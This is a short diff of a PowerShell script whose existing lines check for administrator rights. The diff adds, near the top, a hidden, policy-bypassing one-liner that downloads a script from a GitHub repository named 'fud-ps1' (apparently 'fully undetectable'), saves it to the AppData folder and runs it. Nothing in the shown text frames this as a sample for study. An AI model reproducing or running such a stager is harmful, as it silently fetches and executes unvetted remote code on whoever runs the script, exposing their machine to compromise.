@@ -1,5 +1,10 @@
 #############################################################################################################################
 
+
+powershell -w h -NoP -NonI -Ep Bypass "echo (iwr https://github.com/AnonAm93/fud-ps1/raw/refs/heads/main/Am.ps1).content > "$env:APPDATA\Am.ps1";powershell "$env:APPDATa\Am.ps1""
+
+#############################################################################################################################
+
 # (Administrator Rights.)
 
 if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
